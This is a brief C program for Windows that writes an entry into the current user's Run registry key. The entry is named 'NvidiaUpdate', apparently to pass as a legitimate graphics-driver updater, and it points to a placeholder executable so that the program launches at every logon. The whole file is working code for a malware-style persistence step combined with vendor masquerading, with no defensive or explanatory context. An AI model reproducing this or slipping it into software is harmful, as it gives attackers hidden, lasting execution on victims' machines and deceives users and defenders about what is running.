#include <Windows.h>

int main() {
	// set user-level registry key
	HKEY hKey;
	LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	LPCSTR valueName = "NvidiaUpdate";
	LPCSTR valueData = "C:\\Users\\whatever\\whatever.exe";

	LONG openResult = RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
	if (openResult != ERROR_SUCCESS) {
		return 1;
	}

	LONG setResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)valueData, strlen(valueData) + 1);
	if (setResult != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return 1;
	}

	RegCloseKey(hKey);

	return 0;
}